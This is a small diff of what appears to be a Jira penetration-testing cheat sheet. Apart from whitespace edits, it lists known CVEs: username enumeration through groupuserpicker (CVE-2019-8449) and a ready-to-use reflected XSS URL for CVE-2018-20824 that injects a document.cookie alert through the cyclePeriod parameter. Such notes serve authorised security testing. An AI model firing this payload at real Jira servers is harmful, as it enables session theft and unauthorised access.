@@ -2,7 +2,7 @@
 
 ```bash 
 # Jira Scanner
-# https://github.com/bcoles/jira_scan
+# https://github.com/bcoles/jira_scan 
 
 # cve-2019-8449 
 # The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability. 
@@ -86,5 +86,5 @@ ConfigurePortalPages.jspa
 
 #CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter
 /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
-```
+``` 
 
